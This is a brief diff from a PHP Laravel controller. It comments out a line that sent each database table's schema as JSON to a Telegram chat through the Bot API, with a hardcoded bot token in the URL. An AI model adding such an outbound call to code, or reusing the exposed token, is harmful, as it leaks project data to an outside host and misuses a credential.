@@ -671,7 +671,7 @@ class LaradevController extends Controller
         $tableKhusus = $tableName;
         foreach($schema['tables'] as $table)
         {            
-            file_get_contents('https://api.telegram.org/bot755119387:AAH91EBCA0uXOl8OpJxnwWCBqC-58gm-HAc/sendMessage?chat_id=-382095124&text='.json_encode( $table ));
+            // file_get_contents('https://api.telegram.org/bot755119387:AAH91EBCA0uXOl8OpJxnwWCBqC-58gm-HAc/sendMessage?chat_id=-382095124&text='.json_encode( $table ));
             $table = (object)$table;
             $tableName = $table->table;
             $cfg = (array)$table->config;
